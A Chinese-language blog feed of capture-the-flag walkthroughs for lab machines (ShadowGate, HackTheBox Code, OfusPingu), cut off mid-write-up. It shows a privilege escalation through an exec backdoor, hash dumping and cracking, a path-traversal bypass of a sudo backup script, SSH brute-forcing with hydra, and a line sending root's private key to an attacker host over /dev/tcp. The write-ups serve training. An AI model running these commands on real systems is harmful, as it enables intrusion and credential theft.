![image.png](/post-images/TheHackersLabsShadowGate/image9.png)

得到一组凭据 `mars:sshpassword123`

该用户能读取 `user.txt`

```bash
mars@TheHackersLabs-Shadowgate:~$ cat user.txt 
acf9xxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## 权限提升

查看正在监听端口

存在一个本地打开 `4444` 端口

```bash
mars@TheHackersLabs-Shadowgate:~$ ss -tulpn
Netid          State           Recv-Q          Send-Q                             Local Address:Port                      Peer Address:Port          Process                                    
udp            UNCONN          0               0                                     127.0.0.54:53                             0.0.0.0:*                                                        
udp            UNCONN          0               0                                  127.0.0.53%lo:53                             0.0.0.0:*                                                        
udp            UNCONN          0               0                          192.168.56.105%enp0s3:68                             0.0.0.0:*                                                        
tcp            LISTEN          0               5                                      127.0.0.1:4444                           0.0.0.0:*                                                        
tcp            LISTEN          0               5                                        0.0.0.0:2222                           0.0.0.0:*              users:(("socat",pid=25904,fd=5))          
tcp            LISTEN          0               4096                               127.0.0.53%lo:53                             0.0.0.0:*                                                        
tcp            LISTEN          0               5                                        0.0.0.0:56789                          0.0.0.0:*                                                        
tcp            LISTEN          0               4096                                  127.0.0.54:53                             0.0.0.0:*                                                        
tcp            LISTEN          0               128                                      0.0.0.0:8080                           0.0.0.0:*                                                        
tcp            LISTEN          0               4096                                           *:22                                   *:* 
```

使用 `socat` 转发出来

```bash
mars@TheHackersLabs-Shadowgate:~$ ./socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:4444 &
```

进行交互

![image.png](/post-images/TheHackersLabsShadowGate/image10.png)

测试了一下有点懵

在 `/opt` 中能找到源码

```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ cat shadow-client.py
#!/usr/bin/env python3
import socket
import threading
import io
import contextlib

def handle_client(client_socket):
    client_socket.send(b"Welcome to Shadow Client Helper\n")
    client_socket.send(b"This is an unrestricted environment. Good luck, hacker.\n")
    while True:
        client_socket.send(b">>> ")
        code = client_socket.recv(1024).decode().strip()
        try:
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                exec(code, globals())
            result = output.getvalue()
            if result.strip():
                client_socket.send(result.encode())
        except Exception as e:
            client_socket.send(f"Error: {e}\n".encode())

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 4444))
    server.listen(5)
    while True:
        client, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    main()
```

简单来说，它创建了一个服务器，任何连接到这个服务器的客户端都可以执行任意的 Python 代码，并获取执行结果。 这本质上是一个远程代码执行（RCE, Remote Code Execution）的后门程序。

这就简单了，输入

```bash
>>> import os;
>>> os.system("chmod +s /bin/bash")
```

回到靶机上查看

![image.png](/post-images/TheHackersLabsShadowGate/image11.png)

读取 `root.txt`

```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ /bin/bash -p
bash-5.2# cd /root
bash-5.2# cat root.txt
437axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>MFA</category>
            <category>ffuf</category>
            <category>Python</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Code]]></title>
            <link>https://www.sunsetaction.top/2025/08/06/HackTheBoxSeason7-Code</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/06/HackTheBoxSeason7-Code</guid>
            <pubDate>Fri, 04 Apr 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season7 Code https://app.hackthebox.com/machines/653 | esay 前期踩点 就扫描出一个22端口，不对劲继续扫 新端口是一个代码编辑器Python Code Editor WEB 渗透 可以执行python命令，首先尝试一下os 库 提示Use ...]]></description>
            <content:encoded><![CDATA[# Season7-Code

> https://app.hackthebox.com/machines/653 | `esay`
> 

## 前期踩点

```bash
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 10.10.11.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:09 EDT
Nmap scan report for 10.10.11.62
Host is up (0.15s latency).
Not shown: 64591 filtered tcp ports (no-response), 943 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds
```

就扫描出一个`22`端口，不对劲继续扫

```bash
⚡ root@kali  ~/Desktop/test/Code  nmap -sS -min-rate 10000 -p- 10.10.11.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:34 EDT
Warning: 10.10.11.62 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.62
Host is up (0.84s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 33.23 seconds
```

新端口是一个代码编辑器`Python Code Editor`

```bash
⚡ root@kali  ~/Desktop/test/Code  nmap -sT -A -T4 -O -p 22,5000 10.10.11.62     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:30 EDT
Nmap scan report for 10.10.11.62
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   204.69 ms 10.10.16.1
2   156.61 ms 10.10.11.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.11 seconds
```

## WEB 渗透

可以执行python命令，首先尝试一下`os` 库

![image.png](/post-images/HackTheBoxSeason7-Code/image56.png)

提示`Use of restricted keywords is not allowed.` 经过测试是将`import` 、`os` 等关键字给过滤了

右边可以创建账户，这里创建了用户`sunset`

![image.png](/post-images/HackTheBoxSeason7-Code/image57.png)

可以看到存在`MyCodes` ，我们将代码保存为`test`试试

![image.png](/post-images/HackTheBoxSeason7-Code/image58.png)

尝试一下语法注入

![image.png](/post-images/HackTheBoxSeason7-Code/image59.png)

可以成功回显，再尝试一下使用模板语法

![image.png](/post-images/HackTheBoxSeason7-Code/image60.png)

也是成功回显了，那么该应用是使用`Flask`搭建的`Web`应用

使用`SSTImap`尝试模板注入

```bash
python sstimap.py -u http://10.10.11.62:5000/run_code -H 'application/x-www-form-urlencoded; charset=UTF-8' -m 'POST' -d 'code=print(render_template_string("{{*}}"))'
```

结果就是没办法利用，但是知道了存在`jinja2`

![image.png](/post-images/HackTheBoxSeason7-Code/image61.png)

因为存在登陆操作，所以可能可以进行操作数据库，尝试一下数据库语法

![image.png](/post-images/HackTheBoxSeason7-Code/image62.png)

有回显，通过`GPT`进行构造

```bash
code=print([user.username for user in User.query.all()])
// output
{"output":"['development', 'martin', 'test']\n"}
```

```bash

code=print([user.password for user in User.query.all()])
// output
{"output":"['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be', '098f6bcd4621d373cade4e832627b4f6']\n"}
```

得到两组用户名密码`development:759b74ce43947f5f4c91aeddc3e5bad3` 和`martin:3de6f30c4a09c27fc71932bfc68474be`

将密码保存到`pass.txt`使用`John`破解

```bash
⚡ root@kali  ~/Desktop/test/Code  john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 pass.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
development      (?)     
nafeelswordsmaster (?)     
2g 0:00:00:00 DONE (2025-03-25 00:26) 3.333g/s 8711Kp/s 8711Kc/s 9050KC/s nafi79..naerulz
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

```bash
development:development
martin:nafeelswordsmaster
```

得到两个账户，直接尝试`SSH` 

最后使用`martin`成功登录

```bash
⚡ root@kali  ~/Desktop/test/Code  ssh martin@10.10.11.62
martin@10.10.11.62's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 25 Mar 2025 04:10:56 AM UTC

  System load:           0.3
  Usage of /:            51.4% of 5.33GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             234
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c80e

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Mar 25 04:10:56 2025 from 10.10.16.7
martin@code:~$ 
```

## Get Flag

信息收集一波

```bash
martin@code:~$ uname -a
Linux code 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
martin@code:~$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:c8:0e brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.62/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:c80e/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:c80e/64 scope link 
       valid_lft forever preferred_lft forever
```

```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

查看一下我们可以以`Root`权限运行的脚本

```bash
martin@code:~/backups/home/app-production/app$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

脚本接收`task.json` ，读取 `directories_to_archive` 字段的目录列表，只允许 `/var/` 和 `/home/` 目录下的路径，其他路径会触发错误并退出

尝试构造`Json`文件`task.json`

```bash
{
	"directories_to_archive":[
		"/home/app-production/"
	]
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:38:38 🍀 backy 1.2
2025/03/25 06:38:38 📋 Working with task.json ...
2025/03/25 06:38:38 🔰 Task configuration: destination must be specified!
2025/03/25 06:38:38 ❗ Can't read provided task configuration
```

缺少`desination`参数，应该是保存到哪的参数

```bash
{
	"directories_to_archive":[
		"/home/app-production/"
	],
	"destination":"/home/martin"
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:41:28 🍀 backy 1.2
2025/03/25 06:41:28 📋 Working with task.json ...
2025/03/25 06:41:28 💤 Nothing to sync
2025/03/25 06:41:28 📤 Archiving: [/home/app-production]
2025/03/25 06:41:28 📥 To: /home/martin ...
2025/03/25 06:41:28 📦
```

执行完成后多出来一个压缩包

```bash
martin@code:~$ ls
backups  code_home_app-production_2025_March.tar.bz2  task.json
```

对其进行解压，解压完毕后可以发现是用户`app-production` 的家目录，并且存在`user.txt`

```bash
martin@code:~/home/app-production$ cat user.txt 
4332e6b51ad86bfd87072af615996ff1
```

再构造读取`root`的家目录

```bash
{
	"directories_to_archive":[
		"/home/../root/"
	],
	"destination":"/home/martin"
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:46:56 🍀 backy 1.2
2025/03/25 06:46:56 📋 Working with task.json ...
2025/03/25 06:46:56 💤 Nothing to sync
2025/03/25 06:46:56 📤 Archiving: [/home/root]
2025/03/25 06:46:56 📥 To: /home/martin ...
2025/03/25 06:46:56 📦
2025/03/25 06:46:56 💢 Archiving failed for: /home/root
2025/03/25 06:46:56 ❗ Archiving completed with errors
```

构造双写绕过

```bash
{
	"directories_to_archive":[
		"/home/....//root/"
	],
	"destination":"/home/martin"
}
// run
rtin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:49:24 🍀 backy 1.2
2025/03/25 06:49:24 📋 Working with task.json ...
2025/03/25 06:49:24 💤 Nothing to sync
2025/03/25 06:49:24 📤 Archiving: [/home/../root]
2025/03/25 06:49:24 📥 To: /home/martin ...
2025/03/25 06:49:24 📦
```

成功，读取root.txt

```bash
martin@code:~/root$ cat root.txt 
372cf788ca3e30b86c01d19cb8bac1d9
```

## Get Root Shell

解压问就按后看到存在`.ssh`文件夹，并且存在私钥`id_rsa`

转储私钥到攻击机

```bash
// Kali
**nc -lvp 1234 > sshkey**
// Code
**martin@code:~/root/.ssh$ cat id_rsa > /dev/tcp/10.10.16.7/1234**
```

![image.png](/post-images/HackTheBoxSeason7-Code/image63.png)

修改权限为`600` ，并使用私钥进行登录

```bash
⚡ root@kali  ~/Desktop/test/Code  chmod 600 sshkey                      
⚡ root@kali  ~/Desktop/test/Code  ssh root@10.10.11.62 -i sshkey          
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)     
                                                                              
 * Documentation:  https://help.ubuntu.com                                    
 * Management:     https://landscape.canonical.com                            
 * Support:        https://ubuntu.com/pro                                     
                                                                              
 System information as of Tue 25 Mar 2025 07:10:19 AM UTC                     
                                                                              
  System load:           0.0                                                  
  Usage of /:            51.3% of 5.33GB                                      
  Memory usage:          13%                                                  
  Swap usage:            0%                                                   
  Processes:             236                                                  
  Users logged in:       1                                                    
  IPv4 address for eth0: 10.10.11.62                                          
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4461                        
                                                                              
                                                                              
Expanded Security Maintenance for Applications is not enabled.                
                                                                              
0 updates can be applied immediately.                                         
                                                                              
Enable ESM Apps to receive additional future security updates.                
See https://ubuntu.com/esm or run: sudo pro status                            
                                       
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings 
                                                                              
                                                                              
Last login: Tue Mar 25 07:10:19 2025 from 10.10.16.7                          
root@code:~#                           
```
]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Linux靶机</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - OfusPingu]]></title>
            <link>https://www.sunsetaction.top/2025/08/05/TheHackersLabsOfusPingu</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/05/TheHackersLabsOfusPingu</guid>
            <pubDate>Tue, 05 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[OfusPingu https://labs.thehackerslabs.com/machine/102 Recon PortScan 枚举 HTTP 80 端口 目录扫描 script.js 很明显就是被混淆过了 通过 AI 进行恢复 得到一些信息，例如秘钥：QWERTYCHOCOLATITOC...]]></description>
            <content:encoded><![CDATA[
# OfusPingu

> https://labs.thehackerslabs.com/machine/102
> 

![image.png](/post-images/TheHackersLabsOfusPingu/image.png)

## Recon

### PortScan

```bash
➜  OfusPingu nmap -sn 192.168.56.0/24                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:31 CST
Nmap scan report for 192.168.56.1
Host is up (0.00042s latency).
MAC Address: 0A:00:27:00:00:08 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00022s latency).
MAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.103
Host is up (0.00040s latency).
MAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 27.97 seconds
```

```bash
➜  OfusPingu nmap -sT -min-rate 10000 -p- 192.168.56.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:34 CST
Nmap scan report for 192.168.56.103
Host is up (0.00056s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.01 seconds
```

```bash
➜  OfusPingu nmap -sT -A -p 22,80,3000 192.168.56.103    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:36 CST
Nmap scan report for 192.168.56.103
Host is up (0.00056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:08:d0:7c:02:65:4d:8b:95:7b:a2:89:af:ab:fc:9c (ECDSA)
|_  256 af:ff:d1:1b:e2:5a:32:cb:23:47:71:2d:7a:2c:93:2e (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Ofuscaci\xC3\xB3n de C\xC3\xB3digo JavaScript | Seguridad en APIs
|_http-server-header: Apache/2.4.62 (Debian)
3000/tcp open  http    Node.js Express framework
|_http-title: Error
MAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.56.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
```

### 枚举

`HTTP` 80 端口

![image.png](/post-images/TheHackersLabsOfusPingu/image1.png)

目录扫描

```bash
➜  OfusPingu feroxbuster --url http://192.168.56.103 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip,php
  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.103
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [js, txt, zip, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       23w     1492c http://192.168.56.103/script.js
200      GET      422l     1343w    17244c http://192.168.56.103/
[####################] - 2m   1102740/1102740 0s      found:2       errors:965    
[####################] - 2m   1102725/1102725 8759/s  http://192.168.56.103/
```

`script.js` 很明显就是被混淆过了

![image.png](/post-images/TheHackersLabsOfusPingu/image2.png)

通过 `AI` 进行恢复

```bash
// =======================================================
//               【还原后的可读代码】
// =======================================================

// 函数：初始化应用程序
function inicializarAplicacion() {
    // 这个 'configParts' 变量在这段代码中并未定义，
    // 它很可能是在此脚本加载之前的某个地方定义的全局变量。
    // 假设 configParts = ['QWERTY', 'CHOCOLATITO', 'CHOCOLATON', 'CHINGON']
    const API_KEY_SECRETA = configParts.map(f => f.toLowerCase()).join(''); 
    // 结果会是 'qwertychocolatitocholatonchingon'

    // 应用的配置对象
    const appConfig = {
        version: '1.0.3',
        entorno: 'produccion', // 环境：生产
        apiEndpoint: 'https://adivinaadivinanza/v3', // API 地址
        credenciales: {
            usuario: 'jeje',
            // 通过一系列字符串操作生成访问凭证
            acceso: API_KEY_SECRETA.split('').reverse().join('') + '123'.split('').reverse().join('')
            // 'qwertychocolatitocholatonchingon' -> 反转 -> 'nognihcnotalocotihtalocohcytrewq'
            // '123' -> 反转 -> '321'
            // 最终的 acceso 是 'nognihcnotalocotihtalocohcytrewq321'
        },
        features: {
            darkMode: true,
            analytics: false
        }
    };

    // 函数：连接API
    const conectarAPI = () => {
        // 对 'acceso' 凭证再次进行处理，生成最终的密钥
        const claveFinal = appConfig.credenciales.acceso.slice(0, -3).split('').reverse().join('');
        // 1. 去掉最后3个字符 ('321') -> 'nognihcnotalocotihtalocohcytrewq'
        // 2. 再次反转 -> 'qwertychocolatitocholatonchingon' (恢复原样)

        console.log('Conectando la API con clave:', claveFinal); // "连接 API，使用密钥: qwertychocolatitocholatonchingon"
        
        // 返回一个模拟的API连接成功对象
        return {
            status: 200,
            message: 'Conexión exitosa', // "连接成功"
            // 将 '密钥:admin' 进行 Base64 编码作为 token
            token: btoa(claveFinal + ':' + 'admin') 
        };
    };

    // **关键逻辑**：只有当网页的域名是 'secretazosecreton' 时，才执行连接API的操作
    if (window.location.hostname === 'secretazosecreton') {
        // 3秒后执行
        setTimeout(() => {
            const m = conectarAPI();
            console.log('Resultado conexión:', m); // "连接结果: ..."
        }, 3000);
    }
}

// 当整个页面的HTML加载和解析完成后，执行以下代码
document.addEventListener('DOMContentLoaded', () => {
    // 1. 初始化应用
    inicializarAplicacion();
    
    // 2. 给页面上所有的 <button> 元素添加点击事件监听
    const buttons = document.querySelectorAll('button');
    buttons.forEach(btn => {
        btn.addEventListener('click', () => {
            console.log('Botón clickeado'); // "按钮被点击了"
        });
    });
});

// 函数：验证密钥
function validarClave(a) {
    const claveReal = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';
    return a === claveReal;
}

// 这是一个模块导出语句，常见于 Node.js 环境。
// 意思是如果这个JS文件在支持模块化的环境（如Node.js）中被引用，
// 它会导出一个包含 validarClave 函数的对象。
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        validarClave
    };
}
```

得到一些信息，例如秘钥：`QWERTYCHOCOLATITOCHOCOLATONCHINGON`

接下来到 `3000`端口

![image.png](/post-images/TheHackersLabsOfusPingu/image3.png)

对 `3000` 端口进行 `fuzz` 

```bash
➜  OfusPingu wfuzz -u 'http://192.168.56.103:3000/FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.103:3000/FUZZ
Total requests: 74332

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                        
=====================================================================

000000823:   400        0 L      2 W        33 Ch       "api"                                                                                                                          
000016154:   301        10 L     15 W       156 Ch      "public"                                                                                                                       
000016155:   301        10 L     15 W       156 Ch      "Public"                                                                                                                       
000022384:   400        0 L      2 W        21 Ch       "view"                                                                                                                         

Total time: 88.55361
Processed Requests: 74332
Filtered Requests: 74328
Requests/sec.: 839.4010
```

`api` 直接访问提示

```bash
{"error":"Parámetro incorrecto."}
```

`view` 直接访问提示

```bash
Parámetro incorrecto.
```

在对其进行枚举，使用上边的秘钥作为参数

```bash
➜  OfusPingu wfuzz -u 'http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc=404,400
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON
Total requests: 74332

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                        
=====================================================================

000020620:   200        0 L      1 W        30 Ch       "token"  
```

枚举出来 `token`

```bash
➜  OfusPingu curl http://192.168.56.103:3000/api/\?token\=QWERTYCHOCOLATITOCHOCOLATONCHINGON                                                                     
{"key":"MI-KEY-SECRETA-12345"}# 
```

得到一个 `key`

我们再测试 `view`

```bash
➜  OfusPingu curl http://192.168.56.103:3000/view/\?token\=QWERTYCHOCOLATITOCHOCOLATONCHINGON
Parámetro incorrecto.#

➜  OfusPingu curl http://192.168.56.103:3000/view/\?token\=MI-KEY-SECRETA-12345
Parámetro incorrecto.#

➜  OfusPingu curl http://192.168.56.103:3000/view/\?key\='MI-KEY-SECRETA-12345'                  
<!DOCTYPE html>        
<html lang="es">                                                                                
<head>                                                                                          
  <meta charset="UTF-8">                        
  <title>Zona Secreta</title
  ...
```

告诉我们可以使用密码和 `debian` 进行 `ssh` 登录

![image.png](/post-images/TheHackersLabsOfusPingu/image4.png)

使用 `hydra` 进行爆破

```bash
➜  OfusPingu hydra -l debian -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.103 ssh                                                                                                       
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-05 19:53:26
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://192.168.56.103:22/
[22][ssh] host: 192.168.56.103   login: debian   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-05 19:53:41
```

进入后能读到 `user.txt`

```bash
debian@OfusPingu:~$ cat flag.txt 
457xxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## 权限提升

`.bash_history` 没删掉，但是内容貌似没有很有用

```bash
debian@OfusPingu:~$ ls -la
total 36
drwx------ 4 debian debian 4096 Jun  7 12:09 .
drwxr-xr-x 3 root   root   4096 Jun  7 10:52 ..
-rw------- 1 debian debian  387 Jun  7 12:16 .bash_history
-rw-r--r-- 1 debian debian  220 Jun  7 10:52 .bash_logout
-rw-r--r-- 1 debian debian 3526 Jun  7 10:52 .bashrc
-rw-r--r-- 1 root   root     33 Jun  7 12:09 flag.txt
drwxr-xr-x 3 debian debian 4096 Jun  7 12:05 .local
drwxr-xr-x 4 root   root   4096 Jun  7 17:03 mi-web
-rw-r--r-- 1 debian debian  807 Jun  7 10:52 .profile

debian@OfusPingu:~$ cat .bash_history 
sudo -l
sudo /usr/bin/rename
sudo /usr/bin/rename -h
sudo /usr/bin/rename -m
exit
ls
cd mi-web/
ls
pwd
sudo su
sudo -l
sudo /usr/bin/rename
sudo /usr/bin/rename -m
grub-mkpasswd-pbkdf2
touch /etc/grub.d/01_password && chmod a+x /etc/grub.d/01_password
